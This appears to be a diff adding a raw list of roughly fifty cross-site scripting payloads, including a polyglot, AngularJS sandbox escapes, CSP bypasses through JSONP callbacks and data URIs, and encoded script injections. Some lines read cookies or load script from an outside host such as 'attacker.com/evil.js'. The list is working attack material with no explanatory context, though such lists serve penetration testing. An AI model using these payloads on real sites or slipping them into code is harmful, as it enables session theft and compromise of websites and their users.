@@ -1,0 +1,50 @@
+jaVasCript:/*-/*`/*\`/*’/*”/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
+$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
+"<img src=\"test\" onerror=\"alert(document.domain)\"></img>html overwritten",
+&lt;img src=x onerror=&quot;alert(document.domain)&quot;&gt;
+javascript:alert(1);
+"tag":"</textarea><script>alert(1)</script>"
+'+alert(document.domain)+'
+%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2
+130&scribe_context=l4tqu%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eo7gyv
+alert('Hi, this JavaScript code is running on ' + document.domain)
+"><img src=x onerror=prompt> {     i) Go to program --> scope --> Add asset --> select 'Others' and give "><img src=x onerror=prompt()>
+javascript:prompt(document.domain)
+"><svg/onload=alert(1)>
+%3balert(document.cookie)%3b
+')*alert(1)*v.SS('.mp4
+lodash%22%3E%3C/script%3E%3Ch1%3Evagg-a-bond%20is%20here%20:D%3C/h1%3E%3Cimg%20src=1%20onerror=alert(1)%3E&
+"><img src=x onerror=prompt(1337)>
+knight%27-alert(document.domain)-%27
+<audio src onloadstart=alert(1)>
+![xss" onload=alert(1);//](a)
+></script><img src=x onerror=alert(document.domain)>;//
+"><script>alert(document.cookie);</script>
+javascript:alert(0)><h1>pwn3d</h1></a><img/src=//unskid.me/dist/jesus.gif></div>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+"/>'><script src=https://attacker.com/evil.js></script>
+"/>'><script src=data:text/javascript,alert(1337)></script>
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
+<param name="AllowScriptAccess" value="always"></object>
+"/>'><script src="/user_upload/mypic.png.js"></script>
+"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<div ng-app ng-csp>
+{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
+</div>
+"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
+<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
+<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
+<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
+%3Cscript%20src%3D%22http%3A%2F%2Fmyserver.com%2Fscript.js%22%3E%3C%2Fscript%3E
+<a href=”javascript&colon;alert&lpar;document&period;domain&rpar;”>Click Here</a>Some similiar payload after main payload
+"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script
